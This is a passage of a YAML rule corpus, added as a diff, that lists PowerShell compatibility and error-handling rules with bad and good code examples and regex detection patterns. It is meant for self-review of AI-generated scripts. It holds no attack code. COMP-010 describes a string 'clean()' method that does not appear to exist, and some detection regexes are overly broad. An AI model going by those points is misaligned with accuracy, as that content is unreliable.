@@ -1,0 +1,3091 @@
+schema_version: 0.1.0
+name: prf-reliability-rules
+description: 'Machine-readable reliability rule corpus for AI-generated PowerShell (PRF v0.1.0). Categories:
+  compatibility (COMP), safety (SAFE), idempotency (IDEM), security (SEC), error-handling (ERR). Agents
+  self-review drafts against this corpus per SKILL.md Step 4.'
+rule_count: 100
+categories:
+- compatibility
+- safety
+- idempotency
+- security
+- error-handling
+rules:
+- id: COMP-001
+  category: compatibility
+  severity: high
+  title: Route ForEach-Object -Parallel behind a PowerShell 7 guard
+  description: ForEach-Object -Parallel was introduced in PowerShell 7 and does not exist on Windows PowerShell
+    5.1. On 5.1 the call throws a parameter-not-found error while the pipeline is already running. Wrap
+    the parallel loop in a version check or provide a sequential ForEach-Object fallback so one script
+    serves both runtimes.
+  bad: |
+    1..50 | ForEach-Object -Parallel {
+        Start-Worker $_ -ThrottleLimit 8
+    }
+  good: |
+    if ($PSVersionTable.PSVersion.Major -ge 7) {
+        1..50 | ForEach-Object -Parallel { Start-Worker $_ -ThrottleLimit 8 }
+    }
+    else {
+        1..50 | ForEach-Object { Start-Worker $_ }
+    }
+  rationale: Scripts fail at run time mid-pipeline on 5.1 and half-finished parallel work is lost.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - pipeline
+  detection:
+    pattern: \bForEach-Object\s+-Parallel\b
+- id: COMP-002
+  category: compatibility
+  severity: high
+  title: Do not use && or || pipeline chain operators
+  description: The pipeline chain operators parse only on PowerShell 7 and newer. On 5.1 they raise a
+    parse error that keeps the entire file from executing. Chain commands with if and the automatic success
+    state, or issue each command as its own statement.
+  bad: |
+    Copy-Item app.config $backupDir
+    Remove-Item app.config && Start-Deploy
+  good: |
+    Remove-Item app.config
+    if ($?) { Start-Deploy }
+  rationale: A single parse error prevents the whole script file from loading on 5.1.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - operators
+  detection:
+    pattern: '&&|\|\|'
+    psscriptanalyzer: PSUseCompatibleSyntax
+- id: COMP-003
+  category: compatibility
+  severity: high
+  title: Replace ternary conditionals with if-else assignment
+  description: The ternary conditional operator requires PowerShell 7 and produces a parse error on 5.1.
+    Assign the value inside an if statement and provide the alternative in the else branch.
+  bad: |
+    $label = ($count -gt 1) ? 'files' : 'file'
+  good: |
+    if ($count -gt 1) { $label = 'files' }
+    else { $label = 'file' }
+  rationale: Whole-file parse failure on 5.1 leaves automation silently unexecuted.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - syntax
+  detection:
+    pattern: '\?\s*.+\s*:'
+    psscriptanalyzer: PSUseCompatibleSyntax
+- id: COMP-004
+  category: compatibility
+  severity: high
+  title: Replace null-coalescing operators with explicit null checks
+  description: The null-coalescing operators ?? and ??= were added in PowerShell 7 and fail to parse on
+    5.1. Read the value into a variable, compare it against $null with -eq, and apply the fallback inside
+    an if block.
+  bad: |
+    $timeout = $settings.Timeout ?? 30
+    $settings.Timeout ??= 30
+  good: |
+    $timeout = $settings.Timeout
+    if ($null -eq $timeout) { $timeout = 30 }
+  rationale: Parse failure on 5.1 blocks every downstream step in the same file.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - operators
+  detection:
+    pattern: (\?\?=)|(\?\?)
+    psscriptanalyzer: PSUseCompatibleSyntax
+- id: COMP-005
+  category: compatibility
+  severity: high
+  title: Guard objects before dereference instead of using null-conditional access
+  description: Null-conditional member access chains parse only on PowerShell 7. On 5.1 the whole expression
+    is a parse error rather than a graceful null result. Test each object for null explicitly before dereferencing
+    the next level.
+  bad: |
+    $city = $order.Customer?.Address?.City
+  good: |
+    $city = $null
+    if ($order -and $order.Customer -and $order.Customer.Address) {
+        $city = $order.Customer.Address.City
+    }
+  rationale: Parse failure on 5.1 disables the surrounding feature, and unguarded dereference faults on
+    either runtime when data is incomplete.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - syntax
+  detection:
+    pattern: \w+\?\.
+    psscriptanalyzer: PSUseCompatibleSyntax
+- id: COMP-006
+  category: compatibility
+  severity: medium
+  title: Inspect errors with the catch variable or the Error collection
+  description: The Get-Error cmdlet ships only with PowerShell 7. An error handler that calls it fails
+    on 5.1 at the exact moment diagnosis matters. Use the automatic catch variable for the current record
+    and index into the Error collection for history.
+  bad: |
+    try {
+        Invoke-RestMethod $uri
+    }
+    catch {
+        Get-Error | Format-List *
+    }
+  good: |
+    try {
+        Invoke-RestMethod $uri
+    }
+    catch {
+        $_ | Format-List * -Force
+        $Error[0] | Format-List * -Force
+    }
+  rationale: The diagnostics path crashes on 5.1 during incidents and hides the root cause record.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - error-handling
+  detection:
+    pattern: \bGet-Error\b
+    psscriptanalyzer: PSUseCompatibleCommands
+- id: COMP-007
+  category: compatibility
+  severity: medium
+  title: Build joined strings with -join instead of Join-String
+  description: Join-String exists only in PowerShell 7 and throws CommandNotFound on 5.1. Produce the
+    same aggregation with the -join operator or manual accumulation so formatted output survives on both
+    runtimes.
+  bad: |
+    $list = Get-ChildItem C:\logs -Filter *.log |
+        Select-Object -ExpandProperty Name |
+        Join-String -Separator ', '
+  good: |
+    $list = (Get-ChildItem C:\logs -Filter *.log).Name -join ', '
+  rationale: The pipeline dies with CommandNotFound on 5.1 and the aggregated output is lost.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - pipeline
+  detection:
+    pattern: \bJoin-String\b
+    psscriptanalyzer: PSUseCompatibleCommands
+- id: COMP-008
+  category: compatibility
+  severity: high
+  title: Parse JSON to PSCustomObject for dual-runtime scripts
+  description: ConvertFrom-Json accepts -AsHashtable only on PowerShell 7. On 5.1 the parameter binding
+    fails and the conversion never happens. Convert to PSCustomObject and read properties with dot notation,
+    reserving indexer syntax for shapes you have verified.
+  bad: |
+    $cfg = Get-Content ./app.json -Raw | ConvertFrom-Json -AsHashtable
+    $port = $cfg['server']['port']
+  good: |
+    $cfg = Get-Content ./app.json -Raw | ConvertFrom-Json
+    $port = $cfg.server.port
+  rationale: Configuration load throws on 5.1 and dependent settings resolve to nothing downstream.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - json
+  detection:
+    pattern: ConvertFrom-Json\s+.*-AsHashtable
+- id: COMP-009
+  category: compatibility
+  severity: high
+  title: Pass an explicit encoding to every file-writing cmdlet
+  description: Windows PowerShell 5.1 defaults Out-File and the redirect operators to UTF-16LE while PowerShell
+    7 writes utf8NoBOM, so identical commands yield differently encoded files. Downstream consumers expecting
+    one byte format read mojibake or reject the file. Always pass -Encoding explicitly on Out-File, Set-Content,
+    Add-Content, Export-Csv, and redirect-based writes.
+  bad: |
+    Get-Process | Out-File C:\temp\report.txt
+    "done" >> C:\temp\report.txt
+  good: |
+    Get-Process | Out-File C:\temp\report.txt -Encoding utf8
+    "done" | Add-Content C:\temp\report.txt -Encoding utf8
+  rationale: Silent encoding drift between runtimes corrupts handoff files consumed by parsers that expect
+    one fixed byte format.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - encoding
+  detection:
+    pattern: \bOut-File\b|>>|\s>\s
+- id: COMP-010
+  category: compatibility
+  severity: medium
+  title: Trim strings with the Trim method instead of clean
+  description: The clean instance method belongs to the .NET Core string surface used by PowerShell 7
+    builds and is absent on 5.1. Calling it throws MethodNotFound on Windows PowerShell. Trim leading
+    and trailing whitespace with the Trim method, which exists on every supported runtime.
+  bad: |
+    $name = $rawInput.clean()
+  good: |
+    $name = $rawInput.Trim()
+  rationale: MethodNotFound at run time truncates the string-processing stage on 5.1.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - strings
+  detection:
+    pattern: \.clean\(\)
+- id: COMP-011
+  category: compatibility
+  severity: high
+  title: Probe the OS before reading platform automatic variables
+  description: The $IsWindows, $IsLinux, and $IsMacOS automatic variables are defined only from PowerShell
+    6 onward. On 5.1 they evaluate to $null, so a plain boolean test silently takes the wrong branch even
+    on Windows. Gate reads behind a version check or fall back to environment probes.
+  bad: |
+    if ($IsWindows) { Use-WindowsLayout } else { Use-UnixLayout }
+  good: |
+    $onWindows = $env:OS -eq 'Windows_NT'
+    if ($null -ne $IsWindows) { $onWindows = $IsWindows }
+    if ($onWindows) { Use-WindowsLayout } else { Use-UnixLayout }
+  rationale: Undefined variables evaluate to $null on 5.1 so platform branches take the wrong path silently
+    and write wrong-path artifacts.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - platform
+  detection:
+    pattern: \$Is(Windows|Linux|MacOS)\b
+- id: COMP-012
+  category: compatibility
+  severity: medium
+  title: Branch or abstract Test-Connection calls across versions
+  description: Test-Connection binds -ComputerName on 5.1 and -TargetName on 7, and the two versions return
+    different object shapes with divergent extra parameters. Scripts that hardcode one parameter set throw
+    binding errors on the other runtime. Branch on the major version or use the version-neutral System.Net.NetworkInformation.Ping
+    class.
+  bad: |
+    Test-Connection -TargetName db01.contoso.com -Count 2
+    Test-Connection -ComputerName db01.contoso.com -Count 2
+  good: |
+    $ping = New-Object System.Net.NetworkInformation.Ping
+    $reply = $ping.Send('db01.contoso.com', 2000)
+    $reachable = ($reply.Status -eq [System.Net.NetworkInformation.IPStatus]::Success)
+  rationale: Health checks throw parameter-binding errors on the wrong runtime and reachability decisions
+    flip unpredictably.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - networking
+  detection:
+    pattern: \bTest-Connection\b.*(TargetName|ComputerName)
+- id: COMP-013
+  category: compatibility
+  severity: medium
+  title: Declare the remoting transport explicitly
+  description: SSH-based remoting parameters such as -HostName and -SSHConnection load only in PowerShell
+    7. A session command written for SSH transport cannot run on 5.1 at all. State the intended transport
+    in the script header and use WinRM parameters with -ComputerName and -Credential when the script must
+    run on both runtimes.
+  bad: |
+    $session = New-PSSession -HostName build01 -UserName svc-deploy
+    Invoke-Command -Session $session { hostname }
+  good: |
+    $cred = Get-Credential
+    $session = New-PSSession -ComputerName build01 -Credential $cred
+    Invoke-Command -Session $session { hostname }
+  rationale: SSH-only sessions cannot be created on 5.1 and deployment paths running under Windows PowerShell
+    fail closed.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compatibility
+  - remoting
+  detection:
+    pattern: -(HostName|SSHConnection)\b
+- id: COMP-014
+  category: compatibility
+  severity: high
+  title: Get-WmiObject removed in PowerShell 7 - use Get-CimInstance
+  description: Classic WMI cmdlets exist only in Windows PowerShell and are not shipped in PowerShell
+    7, so any Get-WmiObject call throws CommandNotFound the moment the script runs on a 7.x host.
+  bad: |
+    $os = Get-WmiObject -Class Win32_OperatingSystem
+    $bios = gwmi -Class Win32_BIOS -ComputerName $server
+    $running = Get-WmiObject Win32_Service -Filter "State='Running'"
+  good: |
+    $os = Get-CimInstance -ClassName Win32_OperatingSystem
+    $bios = Get-CimInstance -ClassName Win32_BIOS -ComputerName $server
+    $running = Get-CimInstance -ClassName Win32_Service -Filter "State='Running'"
+  rationale: Get-CimInstance targets the standards-based CIM layer (WSMan by default, DCOM via New-CimSessionOption)
+    and behaves identically on 5.1 and 7, covering every read-side WMI query.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - wmi
+  - cim
+  - removed-cmdlet
+  - cross-version
+  detection:
+    psscriptanalyzer: PSAvoidUsingWMICmdlet
+- id: COMP-015
+  category: compatibility
+  severity: high
+  title: Set-WmiInstance and Register-WmiEvent are gone in PowerShell 7 - move to CIM equivalents
+  description: Set-WmiInstance, Invoke-WmiMethod, Register-WmiEvent and the rest of the legacy WMI mutation
+    surface are Windows-PowerShell-only; the CIM counterparts are New-CimInstance, Set-CimInstance, Invoke-CimMethod
+    and Register-CimIndicationEvent.
+  bad: |
+    $newEnv = Set-WmiInstance -Class Win32_Environment -Arguments @{ Name = 'APP_MODE'; VariableValue = 'prod' }
+    $procResult = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'setup.exe'
+    Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'" -SourceIdentifier ProcWatch
+  good: |
+    Set-CimInstance -Query "SELECT * FROM Win32_Environment WHERE Name = 'APP_MODE'" -Property @{ VariableValue = 'prod' }
+    $procResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'setup.exe' }
+    Register-CimIndicationEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'" -SourceIdentifier ProcWatch
+  rationale: The CIM equivalents run on both editions, return manageable objects you can pipe onward,
+    and keep event subscriptions alive with the same WQL syntax.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - wmi
+  - cim
+  - events
+  - removed-cmdlet
+  detection:
+    psscriptanalyzer: PSAvoidUsingWMICmdlet
+- id: COMP-016
+  category: compatibility
+  severity: high
+  title: Get-EventLog is deprecated and absent from PowerShell 7 - filter with Get-WinEvent
+  description: Get-EventLog talks to the legacy event-log API, was long deprecated and is not shipped
+    in PowerShell 7; Get-WinEvent with -FilterHashtable is the supported and much faster replacement.
+  bad: |
+    $appErrors = Get-EventLog -LogName Application -EntryType Error -Newest 50
+    Get-EventLog -List | Format-Table -AutoSize
+  good: |
+    $appErrors = Get-WinEvent -FilterHashtable @{ LogName = 'Application'; Level = 2 } -MaxEvents 50 -ErrorAction SilentlyContinue
+    Get-WinEvent -ListLog * | Where-Object RecordCount -gt 0 | Select-Object LogName, RecordCount
+  rationale: FilterHashtable pushes filtering into the eventing engine before records hit the pipeline,
+    and Level = 2 maps directly onto the old EntryType Error.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - event-log
+  - get-winevent
+  - logging
+  - removed-cmdlet
+- id: COMP-017
+  category: compatibility
+  severity: medium
+  title: 'No #Requires -Version floor declared at script top'
+  description: 'A script verified on only one edition will happily start on the other and die midway on
+    missing cmdlets, changed defaults or parser differences; an explicit #Requires -Version turns that
+    into an immediate, actionable error.'
+  bad: |
+    param(
+        [string]$ServerName
+    )
+
+    $ids | ForEach-Object -Parallel { Repair-Item $_ }
+  good: |
+    #Requires -Version 7.0
+
+    param(
+        [string]$ServerName
+    )
+
+    $ids | ForEach-Object -Parallel { Repair-Item $_ }
+  rationale: Declare the lowest version actually tested; the engine refuses older hosts up front instead
+    of failing halfway through side effects.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - requires
+  - version-guard
+  - metadata
+- id: COMP-018
+  category: compatibility
+  severity: medium
+  title: Remoting transport assumed instead of probed (SSH remoting exists only on PowerShell 6+)
+  description: New-PSSession -HostName rides OpenSSH-based remoting, which PowerShell 6+ supports only
+    when an ssh client and keys are configured; -ComputerName rides WinRM, which needs domain join or
+    TrustedHosts. Hardcoding either transport fails unpredictably across hosts.
+  bad: |
+    $session = New-PSSession -HostName $server
+    Invoke-Command -Session $session { hostname }
+  good: |
+    $sshReady = $PSVersionTable.PSVersion.Major -ge 6 -and (Get-Command ssh -ErrorAction SilentlyContinue)
+    if ($sshReady) {
+        $session = New-PSSession -HostName $server -UserName $user
+    } else {
+        $session = New-PSSession -ComputerName $server -Authentication Negotiate
+    }
+    Invoke-Command -Session $session { hostname }
+  rationale: Probe the engine version and ssh client availability, then pick the transport the current
+    host actually supports instead of assuming one.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - remoting
+  - winrm
+  - ssh
+  - new-pssession
+- id: COMP-019
+  category: compatibility
+  severity: medium
+  title: Assumed presence of the ActiveDirectory module (RSAT)
+  description: The ActiveDirectory module ships only with RSAT on Windows and additionally needs network
+    line-of-sight to a domain controller; jump boxes, CI agents and cloud sandbox hosts frequently lack
+    one or both.
+  bad: |
+    Import-Module ActiveDirectory
+    Get-ADUser -Identity $upn -Properties Mail
+  good: |
+    if (Get-Module -ListAvailable -Name ActiveDirectory) {
+        Import-Module ActiveDirectory
+        Get-ADUser -Identity $upn -Properties Mail
+    } else {
+        Write-Warning 'ActiveDirectory module not found; install RSAT and verify domain connectivity.'
+    }
+  rationale: Probing with Get-Module -ListAvailable converts a hard import failure into a diagnosable
+    environment message and lets the caller route AD work to a capable host.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - rsat
+  - activedirectory
+  - module-probe
+- id: COMP-020
+  category: compatibility
+  severity: medium
+  title: Unversioned reliance on Az and Microsoft.Graph modules drifts across majors
+  description: Azure and Graph toolkits publish breaking changes in major versions (Az.Accounts context
+    APIs, Microsoft.Graph v1-to-v2 cmdlet renames); importing without a version floor resolves to whatever
+    happens to be installed and breaks between environments.
+  bad: |
+    Connect-AzAccount
+    $subId = (Get-AzContext).Subscription.Id
+    New-MgUser -DisplayName $displayName -MailNickname $nickname
+  good: |
+    $minimum = [version]'2.13.0'
+    $azAccounts = Get-Module -ListAvailable -Name Az.Accounts |
+        Where-Object { $_.Version -ge $minimum } |
+        Sort-Object Version -Descending |
+        Select-Object -First 1
+    if (-not $azAccounts) {
+        throw "Az.Accounts >= $minimum is required; the context API changed across majors."
+    }
+    Import-Module Az.Accounts -RequiredVersion $azAccounts.Version
+    Connect-AzAccount -Subscription $subscriptionId
+    $subId = (Get-AzContext).Subscription.Id
+  rationale: Asserting a minimum (or exact) version before import keeps the context API surface your code
+    touches stable across machines and pipeline images.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - az
+  - microsoft-graph
+  - module-versioning
+  - drift
+- id: COMP-021
+  category: compatibility
+  severity: high
+  title: Cross-platform claim guarded by $IsWindows alone, which is null on 5.1
+  description: The $IsWindows, $IsLinux and $IsMacOS automatic variables exist only on PowerShell 6+;
+    on Windows PowerShell 5.1 they evaluate to $null, so a guard built solely on them silently skips Windows-only
+    work on 5.1 and mislabels the platform.
+  bad: |
+    if ($IsWindows) {
+        Get-SmbShare | Export-Csv shares.csv
+    }
+  good: |
+    $onWindows = if ($PSVersionTable.ContainsKey('Platform')) {
+        $PSVersionTable.Platform -eq 'Win32NT'
+    } else {
+        [Environment]::OSVersion.Platform -eq [System.PlatformID]::Win32NT
+    }
+    if ($onWindows) {
+        Get-SmbShare | Export-Csv shares.csv
+    }
+  rationale: Probe platform from facts that hold on every edition ($PSVersionTable.Platform on 6+, OSVersion
+    fallback elsewhere) before gating Windows-only cmdlets.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - cross-platform
+  - os-guard
+  - iswindows
+  detection:
+    psscriptanalyzer: PSUseCompatibleCommands
+- id: COMP-022
+  category: compatibility
+  severity: medium
+  title: Interactive-host features (colors, prediction, prompts) leak into non-interactive runs
+  description: 'Agent runners, CI, scheduled tasks and remote sessions have no console UI: PSReadLine
+    is not loaded, Write-Host colors are lost, and Read-Host blocks forever waiting for input that never
+    arrives.'
+  bad: |
+    Set-PSReadLineOption -PredictionSource History -ErrorAction Stop
+    Write-Host -ForegroundColor Cyan 'Deploying...' -NoNewline
+    $confirm = Read-Host 'Proceed? y/n'
+  good: |
+    $interactive = [Environment]::UserInteractive
+    if ($interactive) {
+        Set-PSReadLineOption -PredictionSource History -ErrorAction SilentlyContinue
+        Write-Host 'Deploying...' -ForegroundColor Cyan
+        $confirm = Read-Host 'Proceed? y/n'
+    } else {
+        Write-Output 'Deploying...'
+        $confirm = 'y'
+    }
+  rationale: Gate host-specific UX behind an interactivity probe and always emit plain, machine-readable
+    output on the success pipeline so automation consumes results cleanly.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - non-interactive
+  - psreadline
+  - host-ui
+  - output
+- id: COMP-023
+  category: compatibility
+  severity: medium
+  title: Compress-Archive large-archive and unicode caveats differ across builds
+  description: Older Compress-Archive implementations carry a 2 GiB archive ceiling and inconsistent entry-name
+    encoding for non-ASCII paths, producing truncated or unreadable zips; later releases relaxed the limits,
+    so behavior silently varies by host.
+  bad: |
+    Compress-Archive -Path $logRoot -DestinationPath C:\backups\logs.zip
+    Compress-Archive -Path "$env:USERPROFILE\documents\café-notes.txt" -DestinationPath notes.zip
+  good: |
+    $totalBytes = (Get-ChildItem -LiteralPath $logRoot -Recurse -File |
+        Measure-Object -Property Length -Sum).Sum
+    if ($totalBytes -gt 2GB) {
+        tar -czf C:\backups\logs.tar.gz $logRoot
+    } else {
+        Compress-Archive -Path $logRoot -DestinationPath C:\backups\logs.zip
+    }
+  rationale: Measure the payload first, fall back to tar (built-in from 7.4) or .NET ZipArchive with UTF-8
+    entry names for large or unicode sets, and record the expected archive size for verification.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - compress-archive
+  - zip
+  - unicode
+  - size-limit
+- id: COMP-024
+  category: compatibility
+  severity: medium
+  title: Silent dependency on experimental features
+  description: Behavior that depends on an experimental feature (such as PSNativeCommandArgumentPassing)
+    changes or disappears when the host has the feature disabled or renamed; scripts must not assume it
+    is enabled.
+  bad: |
+    # Assumes PSNativeCommandArgumentPassing (experimental) is enabled everywhere
+    & $tool $pathWithSpaces $extraFlag
+  good: |
+    $feature = Get-ExperimentalFeature -Name PSNativeCommandArgumentPassing -ErrorAction SilentlyContinue
+    if (-not ($feature -and $feature.Enabled)) {
+        throw 'Requires experimental feature PSNativeCommandArgumentPassing; enable it or upgrade PowerShell.'
+    }
+    & $tool $pathWithSpaces $extraFlag
+  rationale: Prefer stable surfaces; when an experimental feature is unavoidable, detect its availability
+    explicitly and document the requirement at the top of the script.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - experimental-features
+  - native-commands
+  - determinism
+- id: COMP-025
+  category: compatibility
+  severity: high
+  title: Concurrency mechanism chosen without probing version; runspaces do not share parent state
+  description: 'ForEach-Object -Parallel exists only on PowerShell 7+, and both it and Start-Job execute
+    in fresh runspaces: outer variables arrive as serialized copies, imported modules are not inherited,
+    and mutations of parent collections vanish.'
+  bad: |
+    $results = @()
+    $ids | ForEach-Object -Parallel {
+        $results += Resolve-Id $_
+    }
+  good: |
+    if ($PSVersionTable.PSVersion.Major -ge 7) {
+        $results = $ids | ForEach-Object -Parallel {
+            Import-Module MyModule
+            Resolve-Id $_
+        } -ThrottleLimit 8
+    } else {
+        $jobs = foreach ($id in $ids) {
+            Start-Job -ScriptBlock { param($i) Import-Module MyModule; Resolve-Id $i } -ArgumentList $id
+        }
+        $results = $jobs | Wait-Job | Receive-Job
+    }
+  rationale: Probe the version, emit results through each worker's output stream, and collect them at
+    the join point instead of mutating collections owned by the parent runspace.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - concurrency
+  - start-job
+  - foreach-object-parallel
+  - runspaces
+- id: ERR-001
+  category: error-handling
+  severity: high
+  title: State-changing cmdlet inside try without -ErrorAction Stop
+  description: A mutating cmdlet (Set-ItemProperty, Stop-Process, Invoke-Command, New-Item, Remove-Item,
+    etc.) runs inside a try block without -ErrorAction Stop. Non-terminating errors do not transfer control
+    to the catch block, so execution continues past the failed call and the handler never fires.
+  bad: |
+    try {
+        Set-ItemProperty -Path 'HKLM:\SOFTWARE\MyApp' -Name LastRun -Value (Get-Date)
+        Write-Output 'Registry updated'
+    }
+    catch {
+        Write-Output 'Update failed'
+    }
+  good: |
+    try {
+        Set-ItemProperty -Path 'HKLM:\SOFTWARE\MyApp' -Name LastRun -Value (Get-Date) -ErrorAction Stop
+        Write-Output 'Registry updated'
+    }
+    catch {
+        Write-Error "Registry update failed: $($_.Exception.Message)"
+        exit 1
+    }
+  rationale: 'Most state-changing cmdlets raise non-terminating errors by default. Without -ErrorAction
+    Stop the try/catch is decorative: the script proceeds on stale or missing state, later statements
+    run against a broken assumption, and the catch handler is never invoked.'
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+- id: ERR-002
+  category: error-handling
+  severity: high
+  title: Empty catch block silently swallows failures
+  description: A catch block with an empty body discards the exception entirely. The script reports success,
+    downstream steps operate on missing or partial data, and no message, log entry, or exit code records
+    that anything went wrong.
+  bad: |
+    try {
+        Copy-Item -Path $src -Destination $dst -ErrorAction Stop
+    }
+    catch {
+    }
+    Write-Output 'Copy step done'
+  good: |
+    try {
+        Copy-Item -Path $src -Destination $dst -ErrorAction Stop
+    }
+    catch {
+        Write-Warning "Copy of '$src' failed: $($_.Exception.Message)"
+        throw
+    }
+  rationale: An empty catch block erases every trace of the failure and converts a hard error into silent
+    data corruption. If a failure is genuinely tolerable, say so with a comment and at least a warning
+    or counter; otherwise log and rethrow so the incident is diagnosable.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+- id: ERR-003
+  category: error-handling
+  severity: medium
+  title: Catch block swallows errors without logging, context, or rethrow
+  description: The catch block handles the exception by continuing without writing any log, warning, or
+    context, and without an explicit, commented decision to rethrow or escalate. Some handler code runs,
+    but the failure still leaves no diagnostic trail.
+  bad: |
+    catch [System.IO.IOException] {
+        $script:skippedCount++
+    }
+  good: |
+    catch [System.IO.IOException] {
+        Write-Warning "Skipping '$src': $($_.Exception.Message)"
+        $script:skippedCount++
+        $script:skipped += $src
+    }
+  rationale: Every catch must leave evidence or propagate. A handler that neither logs nor rethrows makes
+    failures unobservable; at minimum record the affected item, the exception message, and the decision
+    taken, so operators can distinguish deliberate tolerance from a hidden bug.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+- id: ERR-004
+  category: error-handling
+  severity: high
+  title: Relying on $? instead of exceptions to detect cmdlet failure
+  description: The script inspects the automatic $? variable to decide whether a cmdlet succeeded. $?
+    is a weak signal that any intermediate statement resets, conflates terminating and non-terminating
+    outcomes, and carries no exception type, message, or stack.
+  bad: |
+    Get-Content -Path $file
+    if (-not $?) {
+        Write-Output 'read failed'
+    }
+    $parsed = $parsedData   # any statement in between has already reset $?
+  good: |
+    try {
+        $content = Get-Content -Path $file -ErrorAction Stop
+    }
+    catch {
+        throw "Could not read '$file': $($_.Exception.Message)"
+    }
+  rationale: Exception handling gives typed, contextual, position-accurate failure detection. $? checks
+    are fragile because Write-Output, assignments, or native commands between the failing call and the
+    check clobber the value, so failures pass undetected or are misattributed.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+- id: ERR-005
+  category: error-handling
+  severity: high
+  title: Setting $ErrorActionPreference to SilentlyContinue at script scope
+  description: A script or profile sets $ErrorActionPreference = 'SilentlyContinue' globally instead of
+    scoping suppression to individual calls. Every cmdlet failure in the entire scope, including failures
+    the author never anticipated, is discarded without a record.
+  bad: |
+    $ErrorActionPreference = 'SilentlyContinue'
+    Remove-Item -Path $tempDir -Recurse
+    Invoke-Command -ComputerName $server -ScriptBlock $sb
+  good: |
+    Remove-Item -Path $tempDir -Recurse -ErrorAction SilentlyContinue
+    Invoke-Command -ComputerName $server -ScriptBlock $sb -ErrorAction Stop
+  rationale: Global suppression converts every unexpected failure anywhere in the script into silence,
+    including in imported modules and code you did not write. Suppress at the call site, where the risk
+    is understood, and let everything else fail loudly with full context.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+- id: ERR-006
+  category: error-handling
+  severity: medium
+  title: Confusing -ErrorAction Ignore with SilentlyContinue semantics
+  description: The rule flags uses of -ErrorAction Ignore where SilentlyContinue semantics are required,
+    or vice versa. Ignore discards the error before it reaches $Error and leaves $? true; SilentlyContinue
+    appends the record to $Error, sets $? to false, and lets the statement sequence continue. Code that
+    later inspects $Error or $? behaves differently depending on which switch was used.
+  bad: |
+    Get-Item -Path $maybe -ErrorAction Ignore
+    if (-not $?) {
+        Write-Output 'missing'   # never reached: Ignore leaves $? true
+    }
+  good: |
+    Get-Item -Path $maybe -ErrorAction SilentlyContinue
+    if (-not $?) {
+        Write-Output 'missing'
+    }
+  rationale: 'The two switches differ in observability and flow: Ignore suppresses completely (no $Error
+    growth, $? stays true), while SilentlyContinue records the failure and flips $?. Choosing the wrong
+    one either pollutes $Error with noise you meant to discard or hides failures you intended to inspect
+    later.'
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+- id: ERR-007
+  category: error-handling
+  severity: high
+  title: Unchecked $LASTEXITCODE after native executable
+  description: The script runs a native executable (git, robocopy, npm, etc.) and continues without inspecting
+    $LASTEXITCODE. Native commands report failure only through their exit code; PowerShell exceptions
+    and $Error never fire for them.
+  bad: |
+    git clone $repo $dir
+    New-Item -Path "$dir/build" -ItemType Directory
+  good: |
+    git clone $repo $dir
+    if ($LASTEXITCODE -ne 0) {
+        throw "git clone failed with exit code $LASTEXITCODE"
+    }
+    New-Item -Path "$dir/build" -ItemType Directory
+  rationale: Without checking $LASTEXITCODE the script keeps building on a half-cloned or missing tree,
+    and the real failure is discovered much later, far from its cause. Check the exit code after every
+    failure-relevant native call; in PowerShell 7.4 or later consider $PSNativeCommandUseErrorActionPreference
+    for broader enforcement.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - errors
+- id: ERR-008
+  category: error-handling
+  severity: high
+  title: Redirecting error stream into success stream with 2>&1
+  description: Using 2>&1 merges error records into the success output stream. Downstream consumers that
+    expect homogeneous objects receive ErrorRecord objects mixed into pipeline data, breaking sorting,
+    conversion, export, and property access; in PowerShell 7 the merged records may also be re-rendered
+    as error text at the end of the pipeline.
+  bad: |
+    $results = Get-ChildItem -Path $root -Recurse 2>&1 |
+        ForEach-Object { $_.FullName }
+  good: |
+    $items = Get-ChildItem -Path $root -Recurse -ErrorAction SilentlyContinue -ErrorVariable errs
+    $items | ForEach-Object { $_.FullName }
